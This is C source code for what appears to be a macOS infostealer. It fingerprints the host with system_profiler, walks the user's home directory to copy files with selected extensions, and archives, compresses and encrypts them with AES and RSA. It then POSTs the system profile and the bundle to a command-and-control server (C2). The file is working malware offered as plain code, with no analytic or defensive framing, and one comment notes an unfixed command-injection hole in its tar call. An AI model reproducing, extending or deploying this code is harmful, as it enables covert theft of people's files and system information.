#include "wisp.h" 

size_t callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct Mem *mem = (struct Mem *)userp;
    char *ptr = realloc(mem->data, mem->size + realsize + 1);
    if (ptr == NULL) return 0;
    mem->data = ptr;
    memcpy(&(mem->data[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->data[mem->size] = 0;
    return realsize;
}



/**
 * Entry: Fetch the RSA public key from a remote URL 
 */
RSA* get_rsa(const char* url) { 
    CURL *curl = curl_easy_init();
    if (!curl) return NULL;
    
    struct Mem mem;
    mem.data = malloc(1);
    mem.size = 0;
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&mem);
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl); 
    
    if (res != CURLE_OK) {
        free(mem.data);
        return NULL;
    }
    
    BIO *bio = BIO_new_mem_buf(mem.data, mem.size);
    RSA *rsa_pub = PEM_read_bio_RSA_PUBKEY(bio, NULL, NULL, NULL);
    BIO_free(bio);
    free(mem.data);
    return rsa_pub;
}

/**
 * send raw data (message) to the remote server 
 */
void overn_out(const char *server_url, const unsigned char *data, size_t size) { 
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
    
    curl_easy_setopt(curl, CURLOPT_URL, server_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, size);
    (void)curl_easy_perform(curl);
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}

void profiler(char *buffer, size_t *offset) {
    FILE *fp;
    char line[1035];

    fp = popen("system_profiler SPSoftwareDataType SPHardwareDataType", "r");
    if (fp == NULL) {
        return;
    }

    *offset += snprintf(buffer + *offset, B - *offset, "[Info]\n");
    while (fgets(line, sizeof(line), fp) != NULL) {
        *offset += snprintf(buffer + *offset, B - *offset, "%s", line);
    }
    pclose(fp);
}

void generate_id(char *id) {
    uuid_t uuid;
    uuid_generate_random(uuid);
    uuid_unparse(uuid, id);
}

unsigned char* encrypt_and_package(const unsigned char *plaintext, size_t plaintext_len,
                                   size_t *out_len, RSA *rsa_pub) {
    unsigned char aes_key[16];
    if (!RAND_bytes(aes_key, sizeof(aes_key))) {
        return NULL;
    }
    
    unsigned char iv[AES_BLOCK_SIZE];
    if (!RAND_bytes(iv, AES_BLOCK_SIZE)) {
         return NULL;
    }
    
    // Dynamically allocate a buffer for the ciphertext.
    int max_ciphertext_len = plaintext_len + AES_BLOCK_SIZE;
    unsigned char *ciphertext = malloc(max_ciphertext_len);
    if (!ciphertext) {
        return NULL;
    }
    
    int ciphertext_len = 0;
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        free(ciphertext);
        return NULL;
    }
    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, aes_key, iv)) {
        EVP_CIPHER_CTX_free(ctx);
        free(ciphertext);
        return NULL;
    }
    int len = 0;
    if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len)) {
        EVP_CIPHER_CTX_free(ctx);
        free(ciphertext);
        return NULL;
    }
    ciphertext_len = len;
    int final_len = 0;
    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &final_len)) {
        EVP_CIPHER_CTX_free(ctx);
        free(ciphertext);
        return NULL;
    }
    ciphertext_len += final_len;
    EVP_CIPHER_CTX_free(ctx);
    
    // Encrypt the AES key with the RSA public key.
    int rsa_size = RSA_size(rsa_pub);
    unsigned char *encrypted_key = malloc(rsa_size);
    if (!encrypted_key) {
        free(ciphertext);
        return NULL;
    }
    int encrypted_key_len = RSA_public_encrypt(sizeof(aes_key), aes_key, encrypted_key,
                                                 rsa_pub, RSA_PKCS1_OAEP_PADDING);
    if (encrypted_key_len == -1) {
        free(encrypted_key);
        free(ciphertext);
        return NULL;
    }
    
    *out_len = 4 + encrypted_key_len + AES_BLOCK_SIZE + 4 + ciphertext_len;
     // 4 bytes (encrypted key length) + encrypted key + IV + 4 bytes (ciphertext length) + ciphertext
    unsigned char *message = malloc(*out_len);
    if (!message) {
        free(encrypted_key);
        free(ciphertext);
        return NULL;
    }
    unsigned char *p = message;
    uint32_t ek_len_net = htonl(encrypted_key_len);
    memcpy(p, &ek_len_net, 4);
    p += 4;
    memcpy(p, encrypted_key, encrypted_key_len);
    p += encrypted_key_len;
    free(encrypted_key);
    memcpy(p, iv, AES_BLOCK_SIZE);
    p += AES_BLOCK_SIZE;
    uint32_t ct_len_net = htonl(ciphertext_len);
    memcpy(p, &ct_len_net, 4);
    p += 4;
    memcpy(p, ciphertext, ciphertext_len);
    
    free(ciphertext);
    return message;
}

void send_profile(RSA *rsa_pub) {
    char buff[B] = {0};
    size_t offset = 0;
    char system_id[37];
    generate_id(system_id);
    
    offset += snprintf(buff + offset, sizeof(buff) - offset, "ID: %s\n", system_id);
    offset += snprintf(buff + offset, sizeof(buff) - offset, "=== Host ===\n");
    profiler(buff, &offset);
    
    size_t packaged_len = 0;
    unsigned char *packaged = encrypt_and_package((unsigned char*)buff, offset, &packaged_len, rsa_pub);
    if (packaged) {
        overn_out(C2, packaged, packaged_len);
        free(packaged);
    }
}


/**
 * File collection 
 */
Object *files[MF];
int file_count = 0;
char tmp_dir[256] = {0};   

// copy routine.
int copy_file(const char *src, const char *dst) {
    FILE *fin = fopen(src, "rb");
    FILE *fout = fopen(dst, "wb");
    if (!fin || !fout) {
        if (fin) fclose(fin);
        if (fout) fclose(fout);
        return -1;
    }
    char buffer[4096];
    size_t bytes;
    while ((bytes = fread(buffer, 1, sizeof(buffer), fin)) > 0) {
        if (fwrite(buffer, 1, bytes, fout) != bytes) {
            fclose(fin);
            fclose(fout);
            return -1;
        }
    }
    fclose(fin);
    fclose(fout);
    return 0;
}


/**
 * nftw callback: check each file and if it has an allowed extension, copy it
 * into our /tmp .
 */
int file_collector(const char *fpath, const struct stat *sb,
                   int typeflag, struct FTW *ftwbuf) {
    (void)ftwbuf;
    if (file_count >= MF)
        return 0;
    if (typeflag == FTW_F && sb->st_size > 0) {
        const char *ext = strrchr(fpath, '.');
        if (ext && ext != fpath) {
            ext++;  // skip the dot
            for (int i = 0; EXTS[i] != NULL; i++) {
                if (strcasecmp(ext, EXTS[i]) == 0) {
                    char *fpath_copy = strdup(fpath);
                    if (!fpath_copy) break;
                    char *base = basename(fpath_copy);
                    char dst_path[512] = {0};
                    snprintf(dst_path, sizeof(dst_path), "%s/%s", tmp_dir, base);
                    free(fpath_copy);
                    if (copy_file(fpath, dst_path) == 0) {
                        Object *obj = malloc(sizeof(Object));
                        if (!obj) break;
                        obj->path = strdup(dst_path);
                        obj->size = sb->st_size;
                        files[file_count++] = obj;
                    }
                    break;
                }
            }
        }
    }
    return 0;
}

unsigned char* compress_data(const unsigned char *in, size_t in_len, size_t *out_len) {
    uLongf destLen = compressBound(in_len);
    unsigned char *out = malloc(destLen);
    if (!out) return NULL;
    if (compress(out, &destLen, in, in_len) != Z_OK) {
        free(out);
        return NULL;
    }
    *out_len = destLen;
    return out;
}

/**
 * Bundle collected files into a tar archive, compress, encrypt, and send 
 */
void send_files_bundle(RSA *rsa_pub) {
    // at least one file.
    if (file_count == 0)
        return;
    char archive_path[512] = {0};
    const char *tmp_id = tmp_dir + 5;  
    snprintf(archive_path, sizeof(archive_path), "/tmp/%s.tar", tmp_id);
    
    char tar_command[1024] = {0};
    snprintf(tar_command, sizeof(tar_command), "tar -cf %s -C %s .", archive_path, tmp_dir);
    
    if (system(tar_command) != 0) {return;} // mhmm CMD-INJECTION ? see tmp_dir 
    
    // Read the tar archive into memory.
    FILE *fp = fopen(archive_path, "rb");
    fseek(fp, 0, SEEK_END);
    long archive_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    unsigned char *archive_data = malloc(archive_size);
    if (!archive_data) {
        fclose(fp);
        return;
    }
    if (fread(archive_data, 1, archive_size, fp) != (size_t)archive_size) {
        fclose(fp);
        free(archive_data);
        return;
    }
    fclose(fp);
    
    // Remove the archive file since its data is now in memory.
    unlink(archive_path);
    
    // Compress
    size_t comp_size = 0;
    unsigned char *comp_data = compress_data(archive_data, archive_size, &comp_size);
    free(archive_data);
    if (!comp_data) {return;}
    
    // Encrypt and package the compressed archive.
    size_t packaged_len = 0;
    unsigned char *packaged = encrypt_and_package(comp_data, comp_size, &packaged_len, rsa_pub);
    free(comp_data);
    if (packaged) {
        overn_out(C2, packaged, packaged_len);
        free(packaged);
    }
}

int sendprofile() {
    strcpy(tmp_dir, "/tmp/XXXXXX");    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    OpenSSL_add_all_algorithms();
    
    RSA *rsa_pub = get_rsa(KU);
    if (!rsa_pub) {
        curl_global_cleanup();
        return EXIT_FAILURE;
    }
    
    // Send system profile.
    send_profile(rsa_pub);
    
    // nftw 
    const char *home = getenv("HOME");
    if (!home) home = ".";
    if (nftw(home, file_collector, 10, FTW_PHYS) == -1) {
        perror("nftw");
    }
    
    // Bundle the collected files into an archive, compress, encrypt, and send.
    send_files_bundle(rsa_pub);
    
    // Cleanup: remove copied files and the temporary directory.
    for (int i = 0; i < file_count; i++) {
        if (files[i]) {
            unlink(files[i]->path);
            free(files[i]->path);
            free(files[i]);
        }
    }
    rmdir(tmp_dir);
    
    RSA_free(rsa_pub);
    EVP_cleanup();
    curl_global_cleanup();
    return 0;
}
